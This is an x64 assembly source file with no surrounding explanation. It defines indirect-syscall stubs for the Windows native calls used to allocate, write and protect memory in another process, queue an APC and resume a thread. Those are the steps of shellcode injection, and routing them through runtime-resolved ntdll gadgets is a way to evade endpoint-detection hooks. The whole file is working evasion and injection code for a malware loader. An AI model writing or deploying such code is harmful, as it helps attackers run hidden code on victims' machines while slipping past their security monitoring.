.intel_syntax noprefix

.global SysNtAllocateVirtualMemory
.global SysNtWriteVirtualMemory
.global SysNtProtectVirtualMemory
.global SysNtQueueApcThread
.global SysNtResumeThread

// runtime-resolved syscall gadget addresses (C populates before first call)
.data
.global g_NtAllocAddr
.global g_NtWriteAddr
.global g_NtProtectAddr
.global g_NtQueueApcAddr
.global g_NtResumeAddr

g_NtAllocAddr:    .quad 0
g_NtWriteAddr:    .quad 0
g_NtProtectAddr:  .quad 0
g_NtQueueApcAddr: .quad 0
g_NtResumeAddr:   .quad 0

.text

SysNtAllocateVirtualMemory:
    mov     r10, rcx
    mov     eax, 0x18
    jmp     qword ptr [rip + g_NtAllocAddr]

SysNtWriteVirtualMemory:
    mov     r10, rcx
    mov     eax, 0x3A
    jmp     qword ptr [rip + g_NtWriteAddr]

SysNtProtectVirtualMemory:
    mov     r10, rcx
    mov     eax, 0x50
    jmp     qword ptr [rip + g_NtProtectAddr]

SysNtQueueApcThread:
    mov     r10, rcx
    mov     eax, 0x45
    jmp     qword ptr [rip + g_NtQueueApcAddr]

SysNtResumeThread:
    mov     r10, rcx
    mov     eax, 0x52
    jmp     qword ptr [rip + g_NtResumeAddr]
